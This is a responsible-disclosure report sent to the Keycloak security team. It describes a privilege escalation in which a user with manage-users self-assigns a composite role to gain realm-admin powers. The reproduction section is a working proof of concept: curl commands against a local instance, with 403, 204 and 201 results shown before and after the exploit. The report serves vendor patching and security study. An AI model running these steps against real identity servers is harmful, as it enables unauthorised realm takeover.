Hi Keycloak Security Team,

I am reporting a privilege escalation vulnerability in Keycloak that allows
a user with only manage-users permission to escalate their privileges by
self-assigning a composite role containing higher-privilege roles.

Affected Version: Latest main branch (commit 3c07b879d5cfaf277caa5d4bc96174347f71f91c)
Tested on: Keycloak 999.0.0-SNAPSHOT built from source

AI Disclosure: AI tools were used to assist in drafting this report. The
vulnerability was manually discovered, verified, and reproduced.

DESCRIPTION:
A user with only manage-users role can assign themselves any realm role,
including composite roles that contain higher-privilege client roles such as
create-client, manage-clients, and manage-realm. The role-mapping endpoint
does not verify whether the assigning user holds the privileges contained
within the composite role being assigned.

ROOT CAUSE:
RolePermissionsV2.java lines 183-195 — when assigning a composite role, the
authorization check validates only the top-level realm role assignment
permission, not the individual client roles nested inside the composite. A
user with manage-users can assign realm roles to users, and the composite
role's internal client roles are inherited without separate authorization.

REPRODUCTION STEPS:

1. Start Keycloak in dev mode on port 8084

2. Get admin token and realm client ID:

KC=http://localhost:8084
tok() {
  curl -s $KC/realms/master/protocol/openid-connect/token \
    -d client_id=admin-cli -d username=admin -d password=admin \
    -d grant_type=password \
    | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])'
}
T=$(tok)

REALM_MGMT_ID=$(curl -s "$KC/admin/realms/master/clients?clientId=master-realm" \
  -H "Authorization: Bearer $T" | python3 -c 'import sys,json;print(json.load(sys.stdin)[0]["id"])')

3. Create a composite role "superhelper" containing create-client and manage-clients:

curl -s -X POST $KC/admin/realms/master/roles \
  -H "Authorization: Bearer $T" \
  -H 'Content-Type: application/json' \
  -d '{"name":"superhelper","composite":false}'

SUPER_ID=$(curl -s $KC/admin/realms/master/roles/superhelper \
  -H "Authorization: Bearer $T" | python3 -c 'import sys,json;print(json.load(sys.stdin)["id"])')

CREATE_CLIENT=$(curl -s $KC/admin/realms/master/clients/$REALM_MGMT_ID/roles/create-client \
  -H "Authorization: Bearer $T")
MANAGE_CLIENTS=$(curl -s $KC/admin/realms/master/clients/$REALM_MGMT_ID/roles/manage-clients \
  -H "Authorization: Bearer $T")
MANAGE_REALM=$(curl -s $KC/admin/realms/master/clients/$REALM_MGMT_ID/roles/manage-realm \
  -H "Authorization: Bearer $T")

curl -s -X POST $KC/admin/realms/master/roles-by-id/$SUPER_ID/composites \
  -H "Authorization: Bearer $T" \
  -H 'Content-Type: application/json' \
  -d "[$CREATE_CLIENT,$MANAGE_CLIENTS,$MANAGE_REALM]"

4. Create "lowadmin" user with only manage-users permission:

T=$(tok)
curl -s -X POST $KC/admin/realms/master/users \
  -H "Authorization: Bearer $T" \
  -H 'Content-Type: application/json' \
  -d '{"username":"lowadmin","enabled":true,"firstName":"L","lastName":"A","credentials":[{"type":"password","value":"lowadmin","temporary":false}]}'

LOWADMIN_ID=$(curl -s "$KC/admin/realms/master/users?username=lowadmin" \
  -H "Authorization: Bearer $T" | python3 -c 'import sys,json;print(json.load(sys.stdin)[0]["id"])')

MANAGE_USERS=$(curl -s $KC/admin/realms/master/clients/$REALM_MGMT_ID/roles/manage-users \
  -H "Authorization: Bearer $T")

curl -s -X POST $KC/admin/realms/master/users/$LOWADMIN_ID/role-mappings/clients/$REALM_MGMT_ID \
  -H "Authorization: Bearer $T" \
  -H 'Content-Type: application/json' \
  -d "[$MANAGE_USERS]"

5. Before exploit — lowadmin cannot create clients (HTTP 403):

LT=$(curl -s $KC/realms/master/protocol/openid-connect/token \
  -d client_id=admin-cli -d username=lowadmin -d password=lowadmin \
  -d grant_type=password \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')

curl -s -o /dev/null -w "HTTP %{http_code}" -X POST $KC/admin/realms/master/clients \
  -H "Authorization: Bearer $LT" \
  -H 'Content-Type: application/json' \
  -d '{"clientId":"test-pwned"}'

Result: HTTP 403

6. Exploit — lowadmin self-assigns superhelper (HTTP 204):

T=$(tok)
SUPER_ROLE=$(curl -s $KC/admin/realms/master/roles/superhelper \
  -H "Authorization: Bearer $T")

curl -s -o /dev/null -w "HTTP %{http_code}" -X POST \
  "$KC/admin/realms/master/users/$LOWADMIN_ID/role-mappings/realm" \
  -H "Authorization: Bearer $LT" \
  -H 'Content-Type: application/json' \
  -d "[$SUPER_ROLE]"

Result: HTTP 204

7. After exploit — lowadmin can now create clients (HTTP 201):

LT2=$(curl -s $KC/realms/master/protocol/openid-connect/token \
  -d client_id=admin-cli -d username=lowadmin -d password=lowadmin \
  -d grant_type=password \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')

curl -s -o /dev/null -w "HTTP %{http_code}" -X POST $KC/admin/realms/master/clients \
  -H "Authorization: Bearer $LT2" \
  -H 'Content-Type: application/json' \
  -d '{"clientId":"test-pwned2"}'

Result: HTTP 201

IMPACT:
- Full privilege escalation from manage-users to realm-admin equivalent
- Any user with manage-users can gain create-client, manage-clients,
  manage-realm, and any other role nested in a composite role
- Complete realm takeover possible

CVSS 3.1: 8.8 (High)
Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

Credit: Muhannad Alsaif (xNadByte)
Contact: Mohnadalsaif1@gmail.com
GitHub: Mohnad-AL-saif
